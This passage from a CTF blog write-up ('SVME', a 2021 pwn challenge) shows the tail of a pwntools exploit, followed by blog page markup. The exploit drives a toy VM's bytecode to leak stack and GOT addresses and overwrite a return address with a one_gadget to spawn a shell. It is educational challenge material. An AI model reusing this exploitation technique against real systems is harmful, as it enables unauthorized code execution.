class="line">code+=p32(LOAD)+p32(code_addr_high)</span><br><span class="line">code+=p32(LOAD)+p32(code_len_low)</span><br><span class="line">code+=p32(LOAD)+p32(code_len_high)</span><br><span class="line">code+=p32(LOAD)+p32(globals_low)</span><br><span class="line">code+=p32(LOAD)+p32(globals_high)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#count ret_addr in stack</span></span><br><span class="line">code+=p32(LOAD)+p32(code_addr_low)</span><br><span class="line">code+=p32(ICONST)+p32(<span class="number">0x28</span>)</span><br><span class="line">code+=p32(ISUB)</span><br><span class="line">code+=p32(STORE)+p32(ret_addr_low)<span class="comment">#ret_addr_low</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#change global addr to ret_addr in stack</span></span><br><span class="line">code+=p32(POP)*<span class="number">2</span></span><br><span class="line">code+=p32(LOAD)+p32(ret_addr_low)</span><br><span class="line">code+=p32(LOAD)+p32(code_addr_high)</span><br><span class="line"></span><br><span class="line"><span class="comment">#count read_got_addr</span></span><br><span class="line">code+=p32(GLOAD)+p32(<span class="number">0</span>)<span class="comment">#ret_addr_low</span></span><br><span class="line">code+=p32(ICONST)+p32(read_got-main_ret)</span><br><span class="line">code+=p32(IADD)</span><br><span class="line">code+=p32(STORE)+p32(read_addr_low)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get elf_addr</span></span><br><span class="line">code+=p32(GLOAD)+p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(STORE)+p32(elf_addr_high)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change global addr to read_got in elf</span></span><br><span class="line">code+=p32(POP)*<span class="number">2</span></span><br><span class="line">code+=p32(LOAD)+p32(read_addr_low)</span><br><span class="line">code+=p32(LOAD)+p32(elf_addr_high)</span><br><span class="line"></span><br><span class="line"><span class="comment">#count one_gadget_addr</span></span><br><span class="line">code+=p32(GLOAD)+p32(<span class="number">0</span>)<span class="comment">#sys_low</span></span><br><span class="line">code+=p32(ICONST)+p32(read_addr-one_gadget[<span class="number">1</span>])</span><br><span class="line">code+=p32(ISUB)</span><br><span class="line">code+=p32(STORE)+p32(og_low)</span><br><span class="line">code+=p32(GLOAD)+p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(STORE)+p32(og_high)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#change global addr to ret_addr in stack</span></span><br><span class="line">code+=p32(POP)*<span class="number">2</span></span><br><span class="line">code+=p32(LOAD)+p32(ret_addr_low)</span><br><span class="line">code+=p32(LOAD)+p32(code_addr_high)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret -&gt; pop rdi -&gt; &quot;sh\x00\x00&quot; -&gt; system</span></span><br><span class="line">code+=p32(LOAD)+p32(og_low)</span><br><span class="line">code+=p32(LOAD)+p32(og_high)<span class="comment">#pop rdi ; ret</span></span><br><span class="line">code+=p32(GSTORE)+p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(GSTORE)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear vm-&gt;nglobals</span></span><br><span class="line">code+=p32(ICONST)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code+=p32(HALT)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x0000000000001D5D)&quot;)</span></span><br><span class="line"></span><br><span class="line">code=code.ljust(<span class="number">512</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">sd(code)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/29/Dragon-ctf-noflippidy/" rel="prev" title="Dragon ctf 2021 | noflippidy">
+      <i class="fa fa-chevron-left"></i> Dragon ctf 2021 | noflippidy
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SVME"><span class="nav-number">1.</span> <span class="nav-text">SVME</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">7ee1n</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://custuvo.github.io/" title="https:&#x2F;&#x2F;custuvo.github.io&#x2F;" rel="noopener" target="_blank">❤Cu3tuv0❤</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://brooke-hub.github.io/" title="https:&#x2F;&#x2F;brooke-hub.github.io&#x2F;" rel="noopener" target="_blank">Wendy</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://r1nd0.github.io/" title="https:&#x2F;&#x2F;r1nd0.github.io&#x2F;" rel="noopener" target="_blank">R1nd0神</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">7ee1n</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : true,
+      appId      : 'gf3X3bhGvA1TTaRXpIJrXU8Q-gzGzoHsz',
+      appKey     : 'PhQvOaVhLbUmODpCMAScvMqy',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":180,"height":360},"dialog":{"enable":false},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
